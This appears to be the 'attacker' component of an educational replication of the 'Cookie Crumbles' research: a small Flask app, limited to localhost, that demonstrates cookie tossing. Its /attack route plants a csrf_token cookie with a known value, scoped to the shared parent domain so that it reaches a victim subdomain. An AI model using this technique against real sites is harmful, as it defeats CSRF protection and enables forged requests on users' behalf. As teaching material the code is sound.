"""
Attacker application ("The Trickster"): demonstrates "cookie tossing" --
a related but different subdomain of the same registrable domain
setting a cookie with the SAME NAME as one the victim subdomain relies
on, scoped broadly (via the Domain attribute) so that browsers will
also attach it to requests toward the victim.

This is the mechanism at the heart of Squarcina et al.'s "Cookie
Crumbles" paper: cookies are scoped by (domain, path, name), not by
which origin actually set them, so a "related" subdomain can plant a
cookie a victim subdomain never expected anyone else to be able to
set.

Runs only on localhost. Part of the educational replication in this
repository -- not intended to demonstrate anything against real,
third-party systems.
"""
from flask import Flask, make_response

app = Flask(__name__)

KNOWN_TOKEN = "a" * 32  # a value the attacker deliberately chooses and knows


@app.route("/attack", methods=["GET"])
def attack():
    html = "<html><body>Nothing to see here.</body></html>"
    resp = make_response(html)
    # The crux of "cookie tossing": setting Domain to the shared parent
    # (registrable) domain makes this cookie eligible to be sent to ANY
    # subdomain of cc-demo.test, including the victim -- even though
    # the victim never intended to trust cookies from this subdomain.
    resp.set_cookie("csrf_token", KNOWN_TOKEN, domain="cc-demo.test", path="/")
    return resp


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001, debug=False)
